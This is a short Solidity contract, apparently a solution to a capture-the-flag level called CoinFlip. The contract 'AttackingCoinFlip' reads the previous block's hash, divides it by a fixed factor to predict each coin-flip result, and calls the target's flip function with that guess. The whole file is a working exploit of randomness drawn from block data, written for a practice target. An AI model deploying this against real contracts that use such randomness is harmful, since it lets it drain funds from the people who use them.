// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 private constant factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip private coinfFlipContract;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        coinfFlipContract = CoinFlip(contractAddress);
    }

    function hackContract() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool expectedGuess = (blockValue / factor) == 1;
        coinfFlipContract.flip(expectedGuess);
    }
}
